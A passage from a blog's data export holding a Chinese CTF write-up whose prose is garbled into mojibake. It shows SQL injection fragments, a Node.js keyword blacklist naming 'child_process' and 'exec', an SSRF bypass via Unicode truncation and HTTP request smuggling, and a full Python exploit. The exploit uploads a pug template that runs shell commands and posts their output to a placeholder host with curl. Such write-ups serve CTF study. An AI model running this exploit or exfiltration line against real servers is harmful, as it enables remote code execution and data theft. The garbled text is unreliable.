USERS WHERE ID =1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 123 | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql> SELECT * FROM USERS WHERE ID = ((select 1,123,'Dumb') SELECT * FROM USERS WHERE ID = ((select 2,123,'Dumb') { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\"search param 'q' missing!\"); }})function blacklist(url) { var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i < arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } }}var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)}) è€ƒç‚¹æ˜¯ssrf, è€Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯ https://xz.aliyun.com/t/2894 åœ¨nodejs8.12.0è¿™ä¸ªç‰ˆæœ¬ä¸­, ç¨‹åºåœ¨åº•å±‚å¤„ç†çš„æ—¶å€™ä¼šèˆå¼ƒé«˜ä½çš„å­—ç¬¦, åªä¿ç•™ä½ä½çš„å­—ç¬¦, ä¹Ÿå°±æ˜¯è¯´ å‡å¦‚æˆ‘ä»¬ä¼ å…¥ 1chr(0xffa0) å¤„ç†åä¼šè¢«æˆªæ–­ä¸º 1chr(0xa0) é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹æ¥è¿›è¡Œç¼–ç ç»•è¿‡, æ–¹æ³•å¦‚ä¸‹ 12def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word)) å…¶ä¸­çš„0xffå¯ä»¥éšæ„è®¾å®š, ä¸ä¼šå½±å“ç»“æœ ç„¶åå†åˆ©ç”¨httpèµ°ç§æ”»å‡», å‘ç¨‹åºå‘é€ä¸¤ä¸ªè¯·æ±‚, è¿™é‡Œåœ¨æ„é€ æ•°æ®åŒ…çš„æ—¶å€™éœ€è¦å°†\\næ›¿æ¢ä¸º\\r\\n, å¦åˆ™å°†æ— æ³•è¯†åˆ«ä¸ºæ­£å¸¸çš„è¯·æ±‚åŒ… 1payload.replace(\"\\n\", \"\\r\\n\") æ¥ç€æˆ‘ä»¬å°±å¯ä»¥æ„é€ è¯·æ±‚ç±»ä¼¼è¿™æ · 12345678910111213141516171819202122 HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 193Origin: http://123.57.212.112:33322Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL3EANY7czeEB7XdWConnection: keep-alive------WebKitFormBoundaryL3EANY7czeEB7XdWContent-Disposition: form-data; name=\"file\"; filename=\"cjm22n.pug\"Content-Type: text/javascriptbaaaaaa------WebKitFormBoundaryL3EANY7czeEB7XdW--GET /flag HTTP/1.1Host: xConnection: closex: å¤§æ¦‚è¿™æ ·çš„è¯·æ±‚æ¥è¿›è¡Œç»•è¿‡, å†çœ‹ç¨‹åºä¸Šä¼ çš„æµç¨‹ æ–‡ä»¶ç›®å½•åœ¨ 1/upload/minetype/ å¦‚æœæˆ‘ä»¬ä½¿å¾—minetypeä¸º 1../template å°±å¯ä»¥å°†æ–‡ä»¶å†™å…¥æ¨¡æ¿ç›®å½•ä¸­, å†é€šè¿‡ è¿™é‡Œè¿›è¡Œä»»æ„è®¿é—®, é¦–å…ˆéœ€è¦rce, æˆ‘ä»¬å¯ä»¥é€šè¿‡pugæ¨¡æ¿çš„ 1- global.process.mainModule.require('child_process').execSync('evalcmd') æ¥æ‰§è¡Œå‘½ä»¤, ç¼–å†™expå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsfrom urllib.parse import quoteurl = \"http://182.92.243.154:33323/\"def upload(cmd): payload = ''' HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 304Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBOpB7RbAKnIckY80Connection: keep-alive------WebKitFormBoundaryBOpB7RbAKnIckY80Content-Disposition: form-data; name=\"file\"; filename=\"cjm00n.pug\"Content-Type: ../template- global.process.mainModule.require('child_process').execSync('curl http://ip:port/ -X POST -d `evalcmd`')------WebKitFormBoundaryBOpB7RbAKnIckY80--GET /flag HTTP/1.1Host: xConnection: closex: ''' payload = payload.replace(\"\\n\", \"\\r\\n\").replace(\"evalcmd\", cmd).replace(\"304\", str(297 + len(cmd))) payload = ''.join(chr(int('0xee' + hex(ord(c))[2:].zfill(2), 16)) for c in payload) params = { \"q\": payload } requests.get(f\"{url}core\", params=params,) try: requests.get(f\"{url}?action=cjm00n\", timeout=2) except: print(\"done\") # print(res)def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word))if __name__ == \"__main__\": upload(\"cat /flag.txt\") # print(exp_code(\"`\")) ä½¿ç”¨çš„æ—¶å€™æ›¿æ¢ä¸€ä¸‹ipå’Œport, ä»¥åŠé‡æ–°è®¡ç®—ä¸€ä¸‹Content-Length æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2020/02/24/æ–°æ˜¥å…¬ç›Šèµ›2020wp/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2020/02/24/%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B2020wp/"}],"tags":[{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"Config","slug":"Config","link":"/tags/Config/"},{"name":"Webå¼€å‘","slug":"Webå¼€å‘","link":"/tags/Web%E5%BC%80%E5%8F%91/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"HackTheBox","slug":"HackTheBox","link":"/tags/HackTheBox/"},{"name":"Script","slug":"Script","link":"/tags/Script/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Pentest","slug":"Pentest","link":"/categories/Pentest/"},{"name":"Blog","slug":"Blog","link":"/categories/Blog/"}]}